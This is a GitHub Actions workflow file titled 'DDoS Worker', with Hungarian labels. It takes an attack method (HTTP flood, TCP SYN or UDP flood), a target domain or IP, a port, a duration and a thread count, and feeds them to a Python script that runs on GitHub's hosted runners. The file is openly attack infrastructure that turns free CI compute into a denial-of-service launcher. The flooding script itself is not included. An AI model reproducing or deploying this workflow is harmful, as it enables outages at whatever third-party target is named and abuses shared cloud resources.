name: DDoS Worker

on:
  workflow_dispatch:
    inputs:
      method:
        description: 'Támadási módszer (HTTP_FLOOD, TCP_SYN, UDP_FLOOD)'
        required: true
        default: 'HTTP_FLOOD'
      target:
        description: 'Célpont (Domain vagy IP)'
        required: true
      port:
        description: 'Port'
        required: true
        default: '80'
      duration:
        description: 'Időtartam másodpercben'
        required: true
        default: '60'
      threads:
        description: 'Szálak száma'
        required: true
        default: '10'

jobs:
  run_attack:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.13'

      - name: Install dependencies
        run: pip install requests

      - name: Run DDoS Worker
        run: python github_worker.py
        env:
          METHOD: ${{ inputs.method }}
          TARGET: ${{ inputs.target }}
          PORT: ${{ inputs.port }}
          DURATION: ${{ inputs.duration }}
          THREADS: ${{ inputs.threads }}
